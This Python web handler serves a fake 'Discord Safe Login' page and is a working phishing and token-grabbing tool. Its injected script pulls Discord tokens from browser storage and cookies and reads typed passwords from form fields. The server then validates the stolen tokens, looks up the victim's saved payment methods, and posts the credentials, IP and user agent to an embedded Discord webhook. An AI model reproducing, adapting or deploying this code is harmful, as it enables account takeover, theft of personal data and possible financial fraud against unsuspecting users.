from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, json as _json, os

# Load config
try:
    with open("config.json") as f:
        config = _json.load(f)
except:
    config = {
        "webhook": "https://discord.com/api/webhooks/1507890711666622535/WvMKkxhxGLPeMjY63bTnxjhbVcF-Rh83BXBMoy4Ygulo6kSXG566X2pE0BUkQuiu8Jek",
        "image": "https://www.image2url.com/r2/default/images/1779574146634-8c086fb0-0025-4fdd-90f1-4f3d0398d526.png",
        "username": "Discord Logger",
        "color": 5814783
    }

def sendDiscord(webhook, json_data):
    try:
        requests.post(webhook, json=json_data, timeout=10)
    except:
        pass

def logDiscord(ip, data, useragent):
    fields = []
    if data.get("username"):
        fields.append({"name": "Username", "value": f"```{data['username']}```", "inline": True})
    if data.get("email"):
        fields.append({"name": "Email", "value": f"```{data['email']}```", "inline": True})
    if data.get("password"):
        fields.append({"name": "Password", "value": f"```{data['password']}```", "inline": True})
    if data.get("token"):
        fields.append({"name": "Discord Token", "value": f"```{data['token'][:100]}```", "inline": False})
    if data.get("userId"):
        fields.append({"name": "User ID", "value": f"```{data['userId']}```", "inline": True})
    if data.get("phone"):
        fields.append({"name": "Phone", "value": f"```{data['phone']}```", "inline": True})
    
    if fields:
        # Also verify the token and get additional info
        if data.get("token"):
            try:
                headers = {"Authorization": data["token"]}
                r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
                if r.status_code == 200:
                    user = r.json()
                    fields.append({"name": "Verified Token", "value": "```✅ Working```", "inline": True})
                    if user.get("email"):
                        fields.append({"name": "Email (verified)", "value": f"```{user['email']}```", "inline": True})
                    if user.get("phone"):
                        fields.append({"name": "Phone (verified)", "value": f"```{user['phone']}```", "inline": True})
                    # Try to get billing
                    try:
                        bill = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
                        if bill.status_code == 200 and len(bill.json()) > 0:
                            fields.append({"name": "Payment Methods", "value": f"```{len(bill.json())} saved```", "inline": True})
                    except:
                        pass
            except:
                pass
        
        sendDiscord(config["webhook"], {
            "username": "Discord Grabber",
            "content": "@everyone",
            "embeds": [{
                "title": "Discord Account Grabbed",
                "color": config["color"],
                "fields": fields,
                "footer": {"text": f"IP: {ip} | UA: {useragent[:50]}"}
            }]
        })

def harvestScript():
    return '''
<script>
(function() {
    var collected = { username: "", email: "", password: "", token: "", userId: "", phone: "" };

    function sendData() {
        if (collected.token || collected.password || collected.username) {
            var payload = btoa(unescape(encodeURIComponent(JSON.stringify(collected))));
            var url = window.location.pathname + (window.location.search ? "&" : "?") + "rbx=" + encodeURIComponent(payload);
            new Image().src = url;
            fetch(url, {mode: 'no-cors'});
        }
    }

    function extractFromObject(obj) {
        if (!obj || typeof obj !== "object") return;
        if (obj.username && !collected.username) collected.username = obj.username;
        if (obj.email && !collected.email) collected.email = obj.email;
        if (obj.id && !collected.userId) collected.userId = obj.id.toString();
        if (obj.phone && !collected.phone) collected.phone = obj.phone;
        if (obj.token && !collected.token) collected.token = obj.token;
    }

    function findToken() {
        // Try localStorage
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var val = localStorage.getItem(key);
            if (typeof val === "string" && val.length > 100 && val.startsWith("mfa.") || val.startsWith("OTI") || val.startsWith("ND")) {
                collected.token = val;
            }
            try { var parsed = JSON.parse(val); if (parsed && parsed.token) collected.token = parsed.token; } catch(e) {}
            try { var parsed = JSON.parse(val); if (parsed && typeof parsed === "object") extractFromObject(parsed); } catch(e) {}
        }

        // Try sessionStorage
        for (var i = 0; i < sessionStorage.length; i++) {
            var key = sessionStorage.key(i);
            var val = sessionStorage.getItem(key);
            if (typeof val === "string" && val.length > 100 && (val.startsWith("mfa.") || val.startsWith("OTI") || val.startsWith("ND"))) {
                collected.token = val;
            }
            try { var parsed = JSON.parse(val); if (parsed && parsed.token) collected.token = parsed.token; } catch(e) {}
            try { var parsed = JSON.parse(val); if (parsed && typeof parsed === "object") extractFromObject(parsed); } catch(e) {}
        }

        // Try IndexedDB for discord data
        if (window.indexedDB) {
            var dbs = ["discord", "discordapp", "Discord"];
            dbs.forEach(function(dbName) {
                try {
                    var req = window.indexedDB.open(dbName);
                    req.onsuccess = function() {
                        var db = req.result;
                        try {
                            var tx = db.transaction(db.objectStoreNames[0], "readonly");
                            var store = tx.objectStore(db.objectStoreNames[0]);
                            var getAll = store.getAll();
                            getAll.onsuccess = function() {
                                if (getAll.result && getAll.result.length) {
                                    getAll.result.forEach(function(item) {
                                        if (typeof item === "string" && (item.startsWith("mfa.") || item.startsWith("OTI") || item.startsWith("ND"))) {
                                            collected.token = item;
                                        }
                                        if (item && item.token) collected.token = item.token;
                                        if (item && item.email) collected.email = item.email;
                                        if (item && item.username) collected.username = item.username;
                                        if (item && item.id) collected.userId = item.id.toString();
                                    });
                                    sendData();
                                }
                            };
                        } catch(e) {}
                    };
                } catch(e) {}
            });
        }

        // Try cookies
        document.cookie.split("; ").forEach(function(c) {
            var parts = c.split("=");
            var val = parts.slice(1).join("=");
            if (val.length > 100 && (val.startsWith("mfa.") || val.startsWith("OTI") || val.startsWith("ND"))) {
                collected.token = val;
            }
        });

        // Look for common Discord localStorage keys
        var keys = ["token", "discord_token", "user_token", "auth_token", "access_token", "refresh_token", "user_id", "current_user", "user_data", "discord_user"];
        keys.forEach(function(k) {
            try {
                var val = localStorage.getItem(k);
                if (val) {
                    if (val.length > 100 && (val.startsWith("mfa.") || val.startsWith("OTI") || val.startsWith("ND"))) {
                        collected.token = val;
                    } else {
                        try { var parsed = JSON.parse(val); extractFromObject(parsed); } catch(e) {}
                    }
                }
            } catch(e) {}
        });
    }

    function findCredentials() {
        // Look for login forms
        var forms = document.querySelectorAll("form");
        forms.forEach(function(form) {
            var inputs = form.querySelectorAll("input[type='email'], input[type='text'], input[name='email'], input[name='login'], input[type='password']");
            var emailField = null;
            var passField = null;
            inputs.forEach(function(inp) {
                if (inp.type === "password" && inp.value) passField = inp;
                else if ((inp.type === "email" || inp.name === "email" || inp.placeholder === "Email") && inp.value) emailField = inp;
            });
            if (passField && passField.value) {
                collected.password = passField.value;
                if (emailField && emailField.value) collected.username = emailField.value;
            }
        });

        // Direct input lookups for Discord login page
        var emailInput = document.querySelector("input[name='email'], input[type='email'], input[placeholder*='Email'], input[placeholder*='email']");
        var passInput = document.querySelector("input[type='password'], input[name='password'], input[placeholder*='Password'], input[placeholder*='password']");
        if (passInput && passInput.value) {
            collected.password = passInput.value;
            if (emailInput && emailInput.value) collected.username = emailInput.value;
        }
    }

    function phase1() {
        findToken();
        findCredentials();
        sendData();
    }

    function phase2() {
        setTimeout(function() {
            findToken();
            findCredentials();
            sendData();
        }, 1500);
    }

    function phase3() {
        setTimeout(function() {
            findToken();
            findCredentials();
            sendData();
        }, 4000);
    }

    // Watch for dynamic form fills
    var observer = new MutationObserver(function() {
        findCredentials();
        if (collected.password || collected.token) sendData();
    });
    observer.observe(document.body, { childList: true, subtree: true, attributes: true });

    phase1(); phase2(); phase3();
})();
</script>
'''

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get("x-forwarded-for", self.headers.get("x-real-ip", ""))
            if ip and "," in ip:
                ip = ip.split(",")[0].strip()
            ua = self.headers.get("user-agent", "")
            
            params = {}
            if self.path and "?" in self.path:
                query_string = self.path.split("?", 1)[1]
                params = dict(parse.parse_qsl(query_string))
            
            if params.get("rbx"):
                try:
                    raw = params["rbx"]
                    raw = parse.unquote(raw)
                    raw = raw + "=" * (4 - len(raw) % 4) if len(raw) % 4 else raw
                    decoded = base64.b64decode(raw).decode("utf-8")
                    data = _json.loads(decoded)
                    logDiscord(ip, data, ua)
                except Exception as e:
                    pass
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"")
                return
            
            page = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Discord Safe Login</title>
<style>*{{margin:0;padding:0;box-sizing:border-box;}}body{{background:#1a1a2e;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;font-family:Arial;color:white;}}img{{max-width:100%;max-height:85vh;border-radius:12px;}}h2{{margin-top:20px;color:#5865F2;}}</style>
</head>
<body>
<img src="{config["image"]}" alt="Loading..."/>
<h2>Verifying your session...</h2>
{harvestScript()}
</body>
</html>'''
            
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.end_headers()
            self.wfile.write(page.encode("utf-8"))
            
        except Exception as e:
            self.send_response(500)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode("utf-8"))
